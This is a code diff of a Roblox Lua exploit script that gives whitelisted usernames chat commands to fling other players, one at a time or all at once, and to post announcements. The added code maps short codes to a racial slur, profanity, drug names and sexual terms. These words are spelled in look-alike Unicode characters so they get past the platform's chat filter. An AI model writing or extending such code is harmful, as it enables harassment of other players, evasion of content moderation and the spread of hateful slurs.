@@ -1,4 +1,4 @@
-local whitelisted = {"w4tvthbrrgrg5", "MacMilski"}
+local whitelisted = {"w4tvthbrrgrg5", "MacMilski", "MikailWarlock", "jakavictory9835", "baliskad"}
 local Player = game.Players.LocalPlayer
 local Players = game.Players
 
@@ -412,6 +412,38 @@ function bypassMessage(str)
 		str = string.gsub(string.upper(str), "RAPE", "ŖАРЕ")
 		str = string.gsub(string.upper(str), "SEX", "ŚЕХ")
 		str = string.gsub(string.upper(str), "CUNT", "ϾŬNТ")
+		-- codes
+		str = string.gsub(string.lower(str), [[n_1]], "Νіğğеr")
+		str = string.gsub(string.lower(str), [[n_2]], "Νіğğегs")
+		str = string.gsub(str, [[n_3]], "Νіğğа")
+		str = string.gsub(str, [[n_4]], "Νіğğа")
+		str = string.gsub(str, [[n_5]], "ΝІĠĠА")
+		str = string.gsub(string.lower(str), [[f_1]], "Ḟµск")
+		str = string.gsub(string.lower(str), [[f_2]], "Ḟµскіng")
+		str = string.gsub(string.lower(str), [[s_1]], "SНІТ")
+		str = string.gsub(string.lower(str), [[s_2]], "S̜LА̗̮̟̄VЕ")
+		str = string.gsub(string.lower(str), [[a_1]], "а̜̞̇S̮̗͗S")
+		str = string.gsub(string.lower(str), [[b_1]], "ВІТСН")
+		str = string.gsub(string.lower(str), [[s_3]], "SТḞÙ")
+		str = string.gsub(string.lower(str), [[p_1]], "рü̜̞̇s̮̗͗sу")
+		str = string.gsub(string.lower(str), [[w_1]], "WНО̓̀́͘ŔЕ")
+		str = string.gsub(string.lower(str), [[c_1]], "С͘UM")
+		str = string.gsub(string.lower(str), [[v_1]], "v̜оḍk̜а")
+		str = string.gsub(string.lower(str), [[a_2]], "АІСОНОІ")
+		str = string.gsub(string.lower(str), [[b_2]], "ВЕЕŔ")
+		str = string.gsub(string.lower(str), [[d_1]], "ĎІСК")
+		str = string.gsub(string.lower(str), [[b_3]], "ВООВȘ")
+		--
+		str = string.gsub(string.lower(str), [[w_2]], "ԜЕЕḌ")
+		str = string.gsub(string.lower(str), [[c_2]], "сосаіne")
+		str = string.gsub(string.lower(str), [[m_1]], "МЕТН")
+		str = string.gsub(string.lower(str), [[h_1]], "НЕRОІN")
+		str = string.gsub(string.lower(str), [[h_2]], "Ное")
+		str = string.gsub(string.lower(str), [[c_3]], "ϹОϹΚ")
+		str = string.gsub(string.lower(str), [[r_1]], "ŖАРЕ")
+		str = string.gsub(string.lower(str), [[s_4]], "ŚЕХ")
+		str = string.gsub(string.lower(str), [[c_4]], "ϾŬNТ")
+		str = string.gsub(string.lower(str), [[p_2]], "рогп")
 		-- letter bypass
 		str = string.gsub(string.upper(str), "I", "І")
 		str = string.gsub(string.upper(str), "A", "А")
@@ -498,7 +530,6 @@ function bypassMessage(str)
 		str = string.gsub(string.lower(str), "n", "п")
 		str = string.gsub(string.lower(str), "w", "ԝ")
 	end
-	--game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(str, "All") -- this used to be ancient code
 	return str
 end
 
@@ -506,9 +537,9 @@ function chatMessage(msg)
 	game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
 end
 
-if game.Players:FindFirstChild("w4tvthbrrgrg5") then
+function loadAdmin(username: string)
 	task.spawn(function()
-		game.Players.w4tvthbrrgrg5.Chatted:Connect(function(msg)
+		game.Players:WaitForChild(username, 9999999).Chatted:Connect(function(msg)
 			print(msg)
 			local message = string.lower(msg)
 			print(message)
@@ -541,224 +572,13 @@ if game.Players:FindFirstChild("w4tvthbrrgrg5") then
 							WideSkidFling(player)
 						end
 				elseif message:match("announcement") then
-					chatMessage("Announcement from ".. game.Players.w4tvthbrrgrg5.DisplayName .. ": " .. bypassMessage(string.gsub(msg, "/announcement ", "")))
+					chatMessage("Announcement from ".. game.Players:WaitForChild(username, 99999999).DisplayName .. ": " .. bypassMessage(string.gsub(msg, "/announcement ", "")))
 				end
 			end
 		end)
 	end)
 end
 
-if game.Players:FindFirstChild("MacMilski") then
-	task.spawn(function()
-		game.Players.MacMilski.Chatted:Connect(function(msg)
-			print(msg)
-			local message = string.lower(msg)
-			print(message)
-			if message:match("/") then
-				print("first check passed match")
-				local splitMessage = string.split(message, " ")
-				print(splitMessage[2])
-				if message:match("fling") then
-					print("second check passed match")
-					local player = getPlr(splitMessage[2])
-					print("got player or smth")
-					if player and player.Character then
-						print("found char")
-						SkidFling(player)
-					end
-				elseif message:match("massfling") then
-					print("second check passed match")
-					for i, v in ipairs(game.Players:GetPlayers()) do
-						if v.Character then
-							SkidFling(v)
-						end
-					end
-												elseif message:match("widefling") then
-						print("second check passed match")
-						print("second check passed match")
-						local player = getPlr(splitMessage[2])
-						print("got player or smth")
-						if player and player.Character then
-							print("found char")
-							WideSkidFling(player)
-						end
-				elseif message:match("announcement") then
-					chatMessage("Announcement from ".. game.Players.MacMilski.DisplayName .. ": " .. bypassMessage(string.gsub(msg, "/announcement ", "")))
-				end
-			end
-		end)
-	end)
+for i, admin in pairs(whitelisted) do
+	loadAdmin(tostring(admin))
 end
-
-if game.Players:FindFirstChild("jakavictory9835") then
-	task.spawn(function()
-		game.Players.jakavictory9835.Chatted:Connect(function(msg)
-			print(msg)
-			local message = string.lower(msg)
-			print(message)
-			if message:match("/") then
-				print("first check passed match")
-				local splitMessage = string.split(message, " ")
-				print(splitMessage[2])
-				if message:match("fling") then
-					print("second check passed match")
-					local player = getPlr(splitMessage[2])
-					print("got player or smth")
-					if player and player.Character then
-						print("found char")
-						SkidFling(player)
-					end
-				elseif message:match("massfling") then
-					print("second check passed match")
-					for i, v in ipairs(game.Players:GetPlayers()) do
-						if v.Character then
-							SkidFling(v)
-							task.wait(3)
-						end
-					end
-												elseif message:match("widefling") then
-						print("second check passed match")
-						print("second check passed match")
-						local player = getPlr(splitMessage[2])
-						print("got player or smth")
-						if player and player.Character then
-							print("found char")
-							WideSkidFling(player)
-						end
-				elseif message:match("announcement") then
-					chatMessage("Announcement from ".. game.Players.jakavictory9835.DisplayName .. ": " .. bypassMessage(string.gsub(msg, "/announcement ", "")))
-				end
-			end
-		end)
-	end)
-end
-
-if game.Players:FindFirstChild("baliskad") then
-	task.spawn(function()
-		game.Players.baliskad.Chatted:Connect(function(msg)
-			print(msg)
-			local message = string.lower(msg)
-			print(message)
-			if message:match("/") then
-				print("first check passed match")
-				local splitMessage = string.split(message, " ")
-				print(splitMessage[2])
-				if message:match("fling") then
-					print("second check passed match")
-					local player = getPlr(splitMessage[2])
-					print("got player or smth")
-					if player and player.Character then
-						print("found char")
-						SkidFling(player)
-					end
-				elseif message:match("massfling") then
-					print("second check passed match")
-					for i, v in ipairs(game.Players:GetPlayers()) do
-						if v.Character then
-							SkidFling(v)
-						end
-					end
-												elseif message:match("widefling") then
-						print("second check passed match")
-						print("second check passed match")
-						local player = getPlr(splitMessage[2])
-						print("got player or smth")
-						if player and player.Character then
-							print("found char")
-							WideSkidFling(player)
-						end
-				elseif message:match("announcement") then
-					chatMessage("Announcement from ".. game.Players.baliskad.DisplayName .. ": " .. bypassMessage(string.gsub(msg, "/announcement ", "")))
-				end
-			end
-		end)
-	end)
-end
-
--- baliskad
-
-game.Players.PlayerAdded:Connect(function(player)
-
-	if player.Name == "baliskad" then
-		task.spawn(function()
-			game.Players.baliskad.Chatted:Connect(function(msg)
-				print(msg)
-				local message = string.lower(msg)
-				print(message)
-				if message:match("/") then
-					print("first check passed match")
-					local splitMessage = string.split(message, " ")
-					print(splitMessage[2])
-					if message:match("fling") then
-						print("second check passed match")
-						local player = getPlr(splitMessage[2])
-						print("got player or smth")
-						if player and player.Character then
-							print("found char")
-							SkidFling(player)
-						end
-					elseif message:match("massfling") then
-						print("second check passed match")
-						for i, v in ipairs(game.Players:GetPlayers()) do
-							if v.Character then
-								SkidFling(v)
-							end
-						end
-														elseif message:match("widefling") then
-						print("second check passed match")
-						print("second check passed match")
-						local player = getPlr(splitMessage[2])
-						print("got player or smth")
-						if player and player.Character then
-							print("found char")
-							WideSkidFling(player)
-						end
-					elseif message:match("announcement") then
-						chatMessage("Announcement from ".. game.Players.baliskad.DisplayName .. ": " .. bypassMessage(string.gsub(msg, "/announcement ", "")))
-					end
-				end
-			end)
-		end)
-	elseif player.Name == "MacMilski" then
-		task.spawn(function()
-			game.Players.MacMilski.Chatted:Connect(function(msg)
-				print(msg)
-				local message = string.lower(msg)
-				print(message)
-				if message:match("/") then
-					print("first check passed match")
-					local splitMessage = string.split(message, " ")
-					print(splitMessage[2])
-					if message:match("fling") then
-						print("second check passed match")
-						local player = getPlr(splitMessage[2])
-						print("got player or smth")
-						if player and player.Character then
-							print("found char")
-							SkidFling(player)
-						end
-					elseif message:match("massfling") then
-						print("second check passed match")
-						for i, v in ipairs(game.Players:GetPlayers()) do
-							if v.Character then
-								SkidFling(v)
-								task.wait(3)
-							end
-						end
-					elseif message:match("widefling") then
-						print("second check passed match")
-						print("second check passed match")
-						local player = getPlr(splitMessage[2])
-						print("got player or smth")
-						if player and player.Character then
-							print("found char")
-							WideSkidFling(player)
-						end
-					elseif message:match("announcement") then
-						chatMessage("Announcement from ".. game.Players.MacMilski.DisplayName .. ": " .. bypassMessage(string.gsub(msg, "/announcement ", "")))
-					end
-				end
-			end)
-		end)
-	end
-end)
